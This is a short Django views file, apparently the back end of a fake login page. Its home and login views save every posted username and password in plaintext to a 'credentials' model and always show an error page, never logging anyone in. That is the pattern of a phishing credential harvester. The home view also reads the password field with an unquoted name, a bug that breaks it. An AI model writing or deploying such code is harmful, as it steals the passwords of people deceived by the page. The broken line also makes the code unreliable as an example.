from django.shortcuts import render
from .models import credentials

# Create your views here.
def home(request):
    if request.method=='POST':
        username=request.POST['username']
        password=request.POST[password]

        credentials.objects.create(username=username,password=password)
        return render(request,'errorpage.html')
    return render(request,'loginpage.html')

def error(request):
    return render(request,'errorpage.html')

def login(request):

    if request.method=='POST':
        username=request.POST['username']
        password=request.POST['password']

        credentials.objects.create(username=username,password=password)
        return render(request,'errorpage.html')